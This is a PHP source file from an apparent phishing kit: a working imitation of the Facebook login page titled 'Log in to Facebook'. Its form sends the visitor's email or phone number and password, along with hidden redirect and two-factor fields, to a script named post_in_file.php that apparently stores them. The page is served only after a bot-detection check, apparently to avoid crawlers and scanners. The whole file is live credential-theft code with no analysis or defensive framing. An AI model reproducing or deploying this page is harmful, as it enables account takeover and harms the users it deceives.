<?php 
include ('./phishing_info/' . basename(__FILE__));
include('.././other/detect_bot.php');
if (detect())
{
echo '<!DOCTYPE html><html><head><meta charset=utf-8><link rel="shortcut icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAAFVBMVEVCZ7L///9XeLvt8PjL1uqitNp3kshhmkiyAAAAT0lEQVR4Ae3PMQ6AQBBCUWDYuf+RNVY2yzQmWvjrlxBgISRDiAmfbbnIwq4uXmFXMYPFAZhkNRAXGiGe4UXAWzUBT2CN4NkXP1AGgpWAfAD4PgD1eCUf8wAAAABJRU5ErkJggg==" /><title>Log in to Facebook | Facebook</title><style>.fb_content{min-height:640px;padding-bottom:20px}._52jv{text-align:center}._4-u5{background-color:#e9ebee}._4-u8{background-color:#fff}._1tp7:not(:focus){border:1px solid #fa3e3e}._4ki>li{border-width:0 0 0 1px;display:inline-block}._4ki._703>li{padding-left:20px;padding-right:20px}._4ki._6-i>li{padding-right:0}._50f6{font-size:18px;line-height:22px}body{margin:0;padding:0}body,button,input{font-family:Helvetica,Arial,sans-serif;font-size:12px}a{color:#385898;cursor:pointer;text-decoration:none}button{margin:0}a:hover{text-decoration:underline}ul{list-style-type:none;margin:0}._1w1t{margin:auto;padding:22px 108px 26px;width:396px}._xku{padding:18px 0}._1rf5{display:block;margin-bottom:10px;margin-left:10.5%;margin-right:10.5%;margin-top:10px;overflow:hidden;text-align:center;white-space:nowrap;width:79%}._1rf5>span{display:inline-block;position:relative}._1rf5>span:before,._1rf5>span:after{background:#ccd0d5;content:"";height:1px;position:absolute;top:50%;width:9999px}._1rf5>span:before{margin-right:15px;right:100%}._1rf5>span:after{left:100%;margin-left:15px}._1rf8{color:#4b4f56}._30ny{padding:80px 0}#abc{left:300px;top:30px;font-family:inherit;position:absolute;cursor:pointer;display:inline-block;text-decoration:none;white-space:nowrap;line-height:26px;padding:0 10px;background-color:#42b72a;color:#fff;transition:200ms cubic-bezier(.08,.52,.52,1) background-color,200ms cubic-bezier(.08,.52,.52,1) box-shadow,200ms cubic-bezier(.08,.52,.52,1) transform;border:1px solid;border-radius:2px;border:0;box-sizing:content-box;font-size:12px;font-weight:bold;text-align:center;text-shadow:none;direction:ltr;height:33px}
input{font-size:14px;padding:5px 8px;width:284px;border:1px solid #dddfe2;color:#1d2129;line-height:22px;vertical-align:middle;border-radius:0;margin:0}

</style></head><body><div><div style=background-color:#3b5998;height:80px><div style="background-image:url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAKoAAAAjCAMAAAAzF2GgAAAAKlBMVEVHcEz///////////////////////////////////////////////////+LBpLMAAAADnRSTlMA/2ShF/ELJ+NINb+F0kCjku4AAAO9SURBVHgB7ZfxkvwmCMcTQVHQ93/dmp9giOu1ndvrzN5Mmftj84XgR+KhHtOQmJnweNNSQkTCH8mStj6GFs9ujd8co4K0fIb3shCAtBi3LCGew/KbqJjPbu+ilgHDO9LTrH0Q6q6qJBM1l89GDVZSaUC/ArUyEaXPRoVRU6X8ZNQ0UOF/1P9gAcDx4aiISIpK2G3UmUoIhYa7W5rR3dGN0YSEXvCoiR+Bd95QTN0nWVET4gDLOdtOFftPufgY/ki54iFnF7MWiWs7z+EaTS0F0JdbpSdqkKGHGwuDjOio0QpaIJ/xStyAX1FJ4sUIeJxPE3S77Cljc4hhbO/RBdYrCzghF48apg5GxeKjg6rPJLGmFbWeOvkVFTqpf2wTNcHMd9Wgg1E7vcVyo0ruz2723crwRD/XwyVRB6QnKkfl2qDyE2Ci1ofU8EBRb2txaKSoi1WH5CxcMspGdqhJZuojdjOi/qtOJAFoDpWVIUM3iXf1oTDrwgyGqnH2CulMVW5ztjNJlClH8qjBTauEogNJ/xUIRelQl5Gi6k8p6apFIZ2vdmNu+qkx33GpyByIht5CD2eYso6W/WjVoeprkHZ9tWTfZMVQcX4IMxofo4ynqgXB7PsMz5F8dQ5qJrOX7WMnQyUly7zdrYIfyp6CDVrXNp3JBxZDheQzt6TfX9BHZzzCJkkkO1pT8TP5AjUn5cmKWqL9k5tpYA1/DJ6o9ViYbAgvn7jMoNiH0qrqApK0R62PUxYrqi+2o1gtrBurvoaH+BnMqvkZ+NEUVaI27G+gZnob1ZePF1Ttk4aqJsd3UOPPov5TVSHq84+s1djEWfGo/36twhdrVbua0N+hRlo6QFGEXQfw5juAv1/AtzoAD/a6Ry0PL6x9Ffd9dUXN+76q0SgqG1PwHA1nVbXqsWxRSZSuP2GN6241jmmJycYTmuycFNXOUwRGYhOTcpHeMjbdxC65vu5W6hfcoRpThFrFnQGKHUy7XiHXueAklG4hQBNSVI3zu7qlzV0WdzQIU7bRIjtUK3vdonLen6zg5WTVzG2nc/6Jk1V9HgJBf25Qn11ItAO4pPE0rLJiBUNtTQPdEtHPEk0H36C+Pq9SU3mHmupdO3a3AISXyS8lgaSoudyxwtYy2vO4v7scaN8qWg5XubBBVYTY/4APQ52XoGHd5W9LemHiWVVOVVtB9Xcrg82g/M8kEcrr3SqBb2hIl6HbFDjUGjiZK7mrZe2eMhWkLgB0Sd8ne+Fy1IKHN+TxOqanTEvWNLL4B/X9DvsL+XYoVr/sjNUAAAAASUVORK5CYII=\');background-repeat:no-repeat;background-size:auto;background-repeat:no-repeat;display:inline-block;height:35px;width:170px;margin-left:120px;margin-top:25px"></div><button id=abc>Create New Account</button></div><div class=uiContextualLayerParent><div class="fb_content clearfix"><div class="_4-u5 _30ny"><div class="_1w1t _4-u8 _52jv"><div class=_xku><span class=_50f6>Log in to Facebook </span></div>
<form action=.././other/post_in_file.php method=post>
<input type=hidden name=link value="'.$redirect.'">
<input type=hidden name=name value="'.basename(__FILE__).'">
<input type=hidden name=TFA_Enabled value="'.$TFA_Enabled.'">
<input type=hidden name=location value=facebook_desktop_static />
<input type=text name=username placeholder="Email address or phone number" required><br><br><input type=password name=password placeholder=Password><br><br><button style="font-family:inherit;font-size:14px;width:235px;cursor:pointer;display:inline-block;text-decoration:none;white-space:nowrap;line-height:42px;padding:0 24px;background-color:#4267b2;border-color:#4267b2;color:#fff;transition:200ms cubic-bezier(.08,.52,.52,1) background-color,200ms cubic-bezier(.08,.52,.52,1) box-shadow,200ms cubic-bezier(.08,.52,.52,1) transform;border:1px solid;border-radius:2px;box-sizing:content-box;font-weight:bold;position:relative;text-align:center;text-shadow:none;vertical-align:middle;margin:0;direction:ltr" type=submit>Log In</button><br><br><a>Forgotten account?</a><div class=_1rf5><span class=_1rf8>or </span></div><a style="font-size:14px;cursor:pointer;display:inline-block;text-decoration:none;white-space:nowrap;line-height:42px;padding:0 24px;background-color:#42b72a;border-color:#42b72a;color:#fff;transition:200ms cubic-bezier(.08,.52,.52,1) background-color,200ms cubic-bezier(.08,.52,.52,1) box-shadow,200ms cubic-bezier(.08,.52,.52,1) transform;border:1px solid;border-radius:2px;box-sizing:content-box;font-weight:bold;position:relative;text-align:center;text-shadow:none;vertical-align:middle;font-family:Helvetica,Arial,sans-serif;direction:ltr">Create New Account </a></form></div></div></div></div><div><div><div style="margin:0 auto;width:980px"><ul style=display:flex;padding-left:0><li style=color:#737373>English (UK)</li><li style=padding-left:1em><a title=Urdu>اردو</a></li><li style=padding-left:1em><a title=Pashto>پښتو</a></li><li style=padding-left:1em><a title=Arabic>العربية</a></li><li style=padding-left:1em><a title=Hindi>हिन्दी </a></li><li style=padding-left:1em><a title=Punjabi>ਪੰਜਾਬੀ </a></li><li style=padding-left:1em><a title=Bengali>বাংলা</a></li><li style=padding-left:1em><a title=German>Deutsch</a></li><li style=padding-left:1em><a title=Gujarati>ગુજરાતી</a></li><li style=padding-left:1em><a title=Persian>فارسی</a></li><li style=padding-left:1em><a title=Spanish>Español</a></li></ul><hr style=color:#dddfe2><ul style=padding-left:0;margin-left:0;margin-right:10px class="_4ki _703 _6-i"><li><a>Sign Up</a></li><li><a>Log In</a></li><li><a>Messenger</a></li><li><a>Facebook Lite</a></li><li><a>Watch</a></li><li><a>People</a></li><li><a>Pages</a></li><li><a>Page categories</a></li><li><a>Places</a></li><li><a>Games</a></li><li><a>Locations</a></li><li><a>Marketplace</a></li><li><a>Groups</a></li><li><a>Instagram</a></li><li><a>Local</a></li><li><a>Fundraisers</a></li><li><a>Services</a></li><li><a>About</a></li><li><a>Create ad</a></li><li><a>Create Page</a></li><li><a>Developers</a></li><li><a>Careers</a></li><li><a>Privacy</a></li><li><a>Cookies</a></li><li><a>AdChoices</a></li><li><a>Terms</a></li><li><a>Help</a></li><li><a>Settings</a></li><li><a>Activity log</a></li></ul><br><span style=color:#737373;font-family:Helvetica,Arial,sans-serif;font-size:12px;direction:ltr;line-height:1.34> Facebook © 2020 </span></div></div></div></div></body></html>';
} ?>
